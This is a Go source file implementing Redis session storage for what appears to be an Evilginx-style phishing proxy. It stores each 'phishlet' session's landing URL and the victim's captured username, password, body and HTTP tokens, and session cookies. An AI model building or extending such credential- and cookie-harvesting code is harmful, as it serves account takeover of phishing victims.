package storage

import (
	"context"
	"encoding/json"
	"fmt"
	"time"

	"github.com/redis/go-redis/v9"
)

const (
	sessionPrefix    = "session:"
	sessionIdPrefix  = "session_id:"
	defaultTTL      = 24 * time.Hour
	cleanupInterval = 1 * time.Hour
)

type RedisStorage struct {
	client  *redis.Client
	options *RedisOptions
}

type RedisOptions struct {
	Addr     string
	Password string
	DB       int
	TTL      time.Duration
}

func NewRedisStorage(opts *RedisOptions) (*RedisStorage, error) {
	if opts.TTL == 0 {
		opts.TTL = defaultTTL
	}

	client := redis.NewClient(&redis.Options{
		Addr:         opts.Addr,
		Password:     opts.Password,
		DB:           opts.DB,
		PoolSize:     10,
		MinIdleConns: 5,
		MaxRetries:   3,
	})

	// Test connection
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	if err := client.Ping(ctx).Err(); err != nil {
		return nil, fmt.Errorf("redis connection failed: %v", err)
	}

	rs := &RedisStorage{
		client:  client,
		options: opts,
	}

	// Start cleanup goroutine
	go rs.periodicCleanup()

	return rs, nil
}

func (rs *RedisStorage) CreateSession(ctx context.Context, sid string, phishlet string, landingURL string, userAgent string, remoteAddr string) error {
	session := &Session{
		Phishlet:     phishlet,
		LandingURL:   landingURL,
		SessionId:    sid,
		UserAgent:    userAgent,
		RemoteAddr:   remoteAddr,
		Custom:       make(map[string]string),
		BodyTokens:   make(map[string]string),
		HttpTokens:   make(map[string]string),
		CookieTokens: make(map[string]map[string]*CookieToken),
		CreateTime:   time.Now().UTC().Unix(),
		UpdateTime:   time.Now().UTC().Unix(),
		ExpiresAt:    time.Now().Add(rs.options.TTL),
		LastAccessed: time.Now(),
	}

	return rs.saveSession(ctx, session)
}


func (rs *RedisStorage) GetSession(ctx context.Context, sid string) (*Session, error) {
	data, err := rs.client.Get(ctx, sessionPrefix+sid).Bytes()
	if err != nil {
		if err == redis.Nil {
			return nil, fmt.Errorf("session not found: %s", sid)
		}
		return nil, err
	}

	var session Session
	if err := json.Unmarshal(data, &session); err != nil {
		return nil, err
	}

	// Update last accessed time
	session.LastAccessed = time.Now()
	if err := rs.saveSession(ctx, &session); err != nil {
		return nil, err
	}

	return &session, nil
}

func (rs *RedisStorage) ListSessions(ctx context.Context) ([]*Session, error) {
	var sessions []*Session
	iter := rs.client.Scan(ctx, 0, sessionPrefix+"*", 0).Iterator()

	for iter.Next(ctx) {
		data, err := rs.client.Get(ctx, iter.Val()).Bytes()
		if err != nil {
			continue
		}

		var session Session
		if err := json.Unmarshal(data, &session); err != nil {
			continue
		}
		sessions = append(sessions, &session)
	}

	return sessions, iter.Err()
}

func (rs *RedisStorage) DeleteSession(ctx context.Context, sid string) error {
	return rs.client.Del(ctx, sessionPrefix+sid).Err()
}

func (rs *RedisStorage) UpdateUsername(ctx context.Context, sid string, username string) error {
	session, err := rs.GetSession(ctx, sid)
	if err != nil {
		return err
	}

	session.Username = username
	session.UpdateTime = time.Now().UTC().Unix()
	return rs.saveSession(ctx, session)
}

func (rs *RedisStorage) UpdatePassword(ctx context.Context, sid string, password string) error {
	session, err := rs.GetSession(ctx, sid)
	if err != nil {
		return err
	}

	session.Password = password
	session.UpdateTime = time.Now().UTC().Unix()
	return rs.saveSession(ctx, session)
}

func (rs *RedisStorage) UpdateCustom(ctx context.Context, sid string, name string, value string) error {
	session, err := rs.GetSession(ctx, sid)
	if err != nil {
		return err
	}

	session.Custom[name] = value
	session.UpdateTime = time.Now().UTC().Unix()
	return rs.saveSession(ctx, session)
}

func (rs *RedisStorage) UpdateBodyTokens(ctx context.Context, sid string, tokens map[string]string) error {
	session, err := rs.GetSession(ctx, sid)
	if err != nil {
		return err
	}

	session.BodyTokens = tokens
	session.UpdateTime = time.Now().UTC().Unix()
	return rs.saveSession(ctx, session)
}

func (rs *RedisStorage) UpdateHttpTokens(ctx context.Context, sid string, tokens map[string]string) error {
	session, err := rs.GetSession(ctx, sid)
	if err != nil {
		return err
	}

	session.HttpTokens = tokens
	session.UpdateTime = time.Now().UTC().Unix()
	return rs.saveSession(ctx, session)
}

func (rs *RedisStorage) UpdateCookieTokens(ctx context.Context, sid string, tokens map[string]map[string]*CookieToken) error {
	session, err := rs.GetSession(ctx, sid)
	if err != nil {
		return err
	}

	session.CookieTokens = tokens
	session.UpdateTime = time.Now().UTC().Unix()
	return rs.saveSession(ctx, session)
}

func (rs *RedisStorage) Cleanup(ctx context.Context) error {
	iter := rs.client.Scan(ctx, 0, sessionPrefix+"*", 0).Iterator()

	for iter.Next(ctx) {
		data, err := rs.client.Get(ctx, iter.Val()).Bytes()
		if err != nil {
			continue
		}

		var session Session
		if err := json.Unmarshal(data, &session); err != nil {
			continue
		}

		if time.Now().After(session.ExpiresAt) {
			rs.client.Del(ctx, sessionPrefix+session.SessionId)
		}
	}

	return iter.Err()
}

func (rs *RedisStorage) Close() error {
	return rs.client.Close()
}

func (rs *RedisStorage) saveSession(ctx context.Context, session *Session) error {
	data, err := json.Marshal(session)
	if err != nil {
		return err
	}

	pipe := rs.client.Pipeline()
	pipe.Set(ctx, sessionPrefix+session.SessionId, data, rs.options.TTL)
	_, err = pipe.Exec(ctx)
	return err
}

func (rs *RedisStorage) periodicCleanup() {
	ticker := time.NewTicker(cleanupInterval)
	defer ticker.Stop()

	for range ticker.C {
		ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
		rs.Cleanup(ctx)
		cancel()
	}
}
